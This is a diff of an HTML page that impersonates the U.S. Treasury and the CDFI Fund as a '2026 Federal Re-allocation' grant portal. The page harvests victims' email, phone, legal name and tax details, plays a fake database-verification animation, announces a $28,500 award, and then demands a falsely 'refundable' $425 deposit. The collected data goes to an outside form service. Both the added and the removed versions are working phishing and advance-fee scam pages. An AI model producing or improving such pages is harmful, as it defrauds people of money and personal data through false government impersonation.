@@ -3,128 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CDFI Fund | Federal Re-allocation Portal</title>
+    <title>Official Portal | U.S. Department of the Treasury</title>
     <style>
-        :root { --primary: #003366; --secondary: #f4f7f9; --accent: #28a745; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--secondary); margin: 0; padding: 0; }
-        .wrapper { max-width: 500px; margin: 40px auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--primary); }
-        .p-20 { padding: 25px; }
-        .text-center { text-align: center; }
+        :root { --fed-blue: #002868; --fed-gold: #bf9411; --bg: #f0f2f5; }
+        body { font-family: 'Times New Roman', Times, serif; background: var(--bg); margin: 0; }
         
-        /* Navigation Steps */
-        .step-content { display: none; }
+        /* Official Header */
+        .gov-banner { background: #000; color: white; font-size: 11px; padding: 5px text-align: center; text-transform: uppercase; letter-spacing: 1px; }
+        .hero-header { background: white; border-bottom: 4px solid var(--fed-gold); padding: 20px; text-align: center; }
+        .hero-header img { width: 80px; margin-bottom: 10px; }
+        
+        .main-container { max-width: 600px; margin: 30px auto; background: white; box-shadow: 0 5px 25px rgba(0,0,0,0.2); border-radius: 4px; overflow: hidden; }
+        .white-house-img { width: 100%; height: 180px; object-fit: cover; border-bottom: 3px solid var(--fed-blue); }
+        
+        .content { padding: 30px; }
+        .step { display: none; }
         .active { display: block; }
 
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        h2 { color: var(--fed-blue); border-bottom: 1px solid #ccc; padding-bottom: 10px; font-family: Arial, sans-serif; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; font-family: Arial, sans-serif; font-size: 13px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #888; border-radius: 2px; box-sizing: border-box; }
         
-        /* Modal Pop-up */
-        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-box { background: white; padding: 30px; border-radius: 8px; max-width: 400px; text-align: center; }
-        .modal-box h3 { color: var(--primary); margin-top: 0; }
-        .btn-yes { background: var(--accent); color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 10px; font-weight: bold;}
-        .btn-no { background: #dc3545; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 10px; }
+        .btn-gov { background: var(--fed-blue); color: white; padding: 15px; width: 100%; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; margin-top: 20px; }
+        .btn-gov:hover { background: #001a44; }
 
-        .v-code { background: #e9ecef; letter-spacing: 5px; font-size: 24px; font-weight: bold; padding: 10px; margin: 15px 0; border: 1px dashed var(--primary); }
-        .ticker { font-size: 12px; color: #666; background: #eee; padding: 5px; margin-top: 15px; border-radius: 4px; }
+        /* Loading Animation */
+        .dna-spinner { text-align: center; padding: 40px; }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--fed-blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Modal styling */
+        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; }
+        .modal { background: white; padding: 30px; max-width: 450px; border-left: 10px solid var(--fed-gold); }
     </style>
 </head>
 <body>
 
-<div id="modalOverlay">
-    <div class="modal-box">
-        <h3>Final Verification Requirement</h3>
-        <p id="modalText"></p>
-        <p style="font-size: 13px; color: #555;">This amount ensures your account is active and will be <strong>fully added back</strong> to your total payout once credited.</p>
-        <button class="btn-yes" onclick="finalizeSubmit()">I AGREE & SUBMIT</button>
-        <button class="btn-no" onclick="closeModal()">DECLINE</button>
+<div class="gov-banner">Official Website of the United States Government • 2026 Federal Re-allocation</div>
+
+<div class="main-container">
+    <img src="https://www.whitehouse.gov/wp-content/uploads/2021/01/white_house.jpg" class="white-house-img" alt="White House Official">
+
+    <div class="content">
+        <div id="step1" class="step active">
+            <h2>Secure Portal Access</h2>
+            <p style="font-size: 14px; color: #555;">Enter your primary contact credentials to begin the 2026 CDFI eligibility scan.</p>
+            <label>Authorized Email Address</label>
+            <input type="email" id="email" placeholder="Required for digital correspondence">
+            <label>Mobile Contact Number</label>
+            <input type="tel" id="phone" placeholder="+1 (555) 000-0000">
+            <button class="btn-gov" onclick="showStep(2)">Initialize Scan</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h2>Eligibility Questionnaire</h2>
+            <label>Tax Filing Status (Last Cycle)</label>
+            <select id="filing">
+                <option>Single</option>
+                <option>Married Filing Jointly</option>
+                <option>Head of Household</option>
+            </select>
+            <label>Adjusted Gross Income (AGI)</label>
+            <input type="number" placeholder="As seen on Form 1040">
+            <label>Number of Dependents</label>
+            <input type="number" placeholder="Enter 0 if none">
+            <label>Full Legal Name</label>
+            <input type="text" id="name" placeholder="Full name as it appears on SSN card">
+            <button class="btn-gov" onclick="runProcessing()">Verify Records</button>
+        </div>
+
+        <div id="step3" class="step dna-spinner">
+            <div class="loader"></div>
+            <h3>Cross-Referencing Federal Databases...</h3>
+            <p id="progressText">Analyzing IRS Tax Transcripts...</p>
+        </div>
+
+        <div id="step4" class="step text-center">
+            <h2 style="color: var(--accent);">Verification Successful ✅</h2>
+            <div style="background: #eef; padding: 20px; border: 1px solid var(--fed-blue); margin: 20px 0;">
+                <p>Allocated Grant Amount:</p>
+                <h1 style="font-size: 42px; margin: 0;">$28,500.00</h1>
+            </div>
+            <button class="btn-gov" onclick="openFinalModal()">PROCEED TO DISBURSEMENT</button>
+        </div>
     </div>
 </div>
 
-<div class="wrapper">
-    <div id="step1" class="step-content active p-20">
-        <div class="text-center">
-            <h3>Treasury Login Portal</h3>
-            <p>Access your individual 2026 allocation.</p>
-        </div>
-        <input type="email" id="uEmail" placeholder="Email Address" required>
-        <input type="tel" id="uPhone" placeholder="Mobile Number" required>
-        <button onclick="goToStep(2)">Generate Access Code</button>
-        <div class="ticker">Recent: ✅ Amanda R. ($22,000) ... ✅ Luis T. ($15,500)</div>
-    </div>
-
-    <div id="step2" class="step-content p-20 text-center">
-        <h3>Security Code</h3>
-        <div class="v-code">CDFI-992</div>
-        <input type="text" id="vInput" placeholder="Enter Code Above">
-        <button onclick="checkCode()">Verify Identity</button>
-    </div>
-
-    <div id="step3" class="step-content p-20">
-        <div class="text-center">
-            <h2 style="color:var(--accent)">Approved: $24,500.00</h2>
-            <p>Complete your disbursement profile.</p>
-        </div>
-        <form id="mainForm" action="https://formspree.io/f/YOUR_ID_HERE" method="POST">
-            <input type="hidden" name="Auth_Email" id="hEmail">
-            <input type="hidden" name="Auth_Phone" id="hPhone">
-            <input type="hidden" name="Security_Deposit_Agreed" id="hDeposit">
-            
-            <input type="text" name="Legal_Name" placeholder="Full Legal Name" required>
-            <input type="text" name="Address" placeholder="Physical Address" required>
-            <input type="text" name="Bank" placeholder="Bank Name" required>
-            
-            <button type="button" onclick="openModal()">CLAIM ALLOCATION</button>
+<div id="modalOverlay">
+    <div class="modal">
+        <h3 style="color:var(--fed-blue)">Internal Revenue Service Compliance</h3>
+        <p>To finalize the release of <strong>$28,500.00</strong> to your private account, a <strong>Security Synchronization Deposit</strong> is required.</p>
+        <p><strong>Required Amount: $425.00</strong></p>
+        <p style="font-style: italic; font-size: 13px;">*Note: This amount is fully refundable and will be appended to your total payout balance ($28,925.00) once cleared.</p>
+        
+        <form action="https://formspree.io/f/YOUR_ID" method="POST" id="finalForm">
+            <input type="hidden" name="User_Email" id="hEmail">
+            <input type="hidden" name="User_Phone" id="hPhone">
+            <input type="hidden" name="Full_Name" id="hName">
+            <input type="hidden" name="Compliance_Agreed" value="YES - $425">
+            <button type="submit" class="btn-gov">I ACCEPT & REQUEST PAYMENT</button>
         </form>
-    </div>
-
-    <div id="step4" class="step-content p-20 text-center">
-        <h1 style="color:var(--accent)">SUCCESS! ✅</h1>
-        <p>Your application is now being processed.</p>
-        <p>The security deposit will be added to your final payout. Please check your provided email address (<strong><span id="displayEmail"></span></strong>) within the next 30 minutes for the final steps.</p>
-        <button onclick="location.reload()">Back to Home</button>
     </div>
 </div>
 
 <script>
-    function goToStep(s) {
-        document.querySelectorAll('.step-content').forEach(div => div.classList.remove('active'));
-        document.getElementById('step'+s).classList.add('active');
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step'+n).classList.add('active');
     }
 
-    function checkCode() {
-        if(document.getElementById('vInput').value === 'CDFI-992') {
-            document.getElementById('hEmail').value = document.getElementById('uEmail').value;
-            document.getElementById('hPhone').value = document.getElementById('uPhone').value;
-            goToStep(3);
-        } else { alert("Code Incorrect"); }
+    function runProcessing() {
+        showStep(3);
+        const steps = ["Validating SSN Authenticity...", "Checking Treasury Re-allocation Limits...", "Finalizing Individual Credit..."];
+        let i = 0;
+        const interval = setInterval(() => {
+            document.getElementById('progressText').innerText = steps[i];
+            i++;
+            if(i >= steps.length) {
+                clearInterval(interval);
+                showStep(4);
+            }
+        }, 2500);
     }
 
-    function openModal() {
-        // Calculate Deposit (Logic: Award is $24,500, so deposit is set to $420 for this example)
-        const deposit = 420; 
-        document.getElementById('modalText').innerHTML = `To facilitate this transfer, a <strong>Refundable Security Deposit of $${deposit}</strong> is required for account synchronization.`;
-        document.getElementById('hDeposit').value = "$"+deposit;
+    function openFinalModal() {
+        document.getElementById('hEmail').value = document.getElementById('email').value;
+        document.getElementById('hPhone').value = document.getElementById('phone').value;
+        document.getElementById('hName').value = document.getElementById('name').value;
         document.getElementById('modalOverlay').style.display = 'flex';
-    }
-
-    function closeModal() { document.getElementById('modalOverlay').style.display = 'none'; }
-
-    async function finalizeSubmit() {
-        const form = document.getElementById('mainForm');
-        const formData = new FormData(form);
-        
-        // Show success screen immediately
-        document.getElementById('displayEmail').innerText = document.getElementById('uEmail').value;
-        closeModal();
-        goToStep(4);
-
-        // Send the email in the background
-        fetch(form.action, {
-            method: 'POST',
-            body: formData,
-            headers: { 'Accept': 'application/json' }
-        });
     }
 </script>
 
